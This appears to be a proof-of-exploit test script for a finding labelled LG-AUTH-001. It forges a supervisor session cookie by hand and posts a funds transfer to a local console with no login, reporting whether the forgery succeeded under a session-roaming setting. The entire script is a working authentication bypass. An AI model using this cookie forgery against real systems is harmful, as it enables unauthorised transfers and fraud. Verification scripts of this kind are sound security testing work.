#!/usr/bin/env bash
set -euo pipefail
# LG-AUTH-001 proof-of-exploit: forge a session and post a transfer with NO login. Sends the console
# a hand-built session cookie (lgsession = 'LG' + staff(10) + role(1) + branch(4)); fires (exit 0)
# when the console accepts it and returns a POSTED transfer result -- only possible with session_roaming=on.
# Under session_roaming=off the forged cookie is rejected and the login page is returned (inert).
# Hits the console directly on its published port. Env: CONSOLE_URL (default http://localhost:8085).

CONSOLE_URL="${CONSOLE_URL:-http://localhost:8085}"
FORGED="LGSUP0010000S0007"   # SUP001 / SUPERVISOR / branch 0007, constructed by hand

resp="$(curl -sS -X POST "$CONSOLE_URL/transfer" \
  -H "Cookie: lgsession=$FORGED" \
  --data 'from_account=000000000042&to_account=000000000043&amount=100.00&currency=USD&requested_by=0000000007')"

if printf '%s' "$resp" | grep -q 'POSTED'; then
  echo "LG-AUTH-001 FIRED: forged session posted a transfer (no login)"
  exit 0
fi
echo "LG-AUTH-001 not fired (forged cookie rejected)" >&2
exit 1
